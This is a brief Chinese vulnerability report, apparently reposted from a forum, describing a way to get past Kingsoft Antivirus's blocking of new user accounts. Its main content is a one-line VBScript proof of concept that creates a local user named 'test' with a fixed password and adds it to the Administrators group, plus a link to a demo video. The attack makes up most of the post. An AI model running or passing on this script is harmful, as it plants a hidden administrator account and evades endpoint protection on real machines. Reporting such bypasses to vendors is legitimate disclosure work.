# Bypass金山毒霸

> 原文：[https://www.zhihuifly.com/t/topic/3457](https://www.zhihuifly.com/t/topic/3457)

# 金山毒霸添加用拦截功能绕过

# 相关厂商

金山毒霸

# 漏洞类型

拦截绕过

# 自评危害等级

高危

# 详细介绍：

金山毒霸添加用拦截功能绕过

POC如下：

```
set wsnetwork=CreateObject("WSCRIPT.NETWORK"):os="WinNT://"&wsnetwork.ComputerName:Set ob=GetObject(os):Set oe=GetObject(os&"/Administrators,group"):Set od=ob.Create("user","test"):od.SetPassword "password":od.SetInfo:Set of=GetObject(os&"/test",user):oe.add os&"/test" 
```

![image](img/3dda38be07fd0b4b1b6f13482d14390b.png)

测试视频演示下载地址：https://pan.baidu.com/s/1YsRrLVeALZH0vudbCn6WPQ 0sec
链接如挂，请群内反馈,谢谢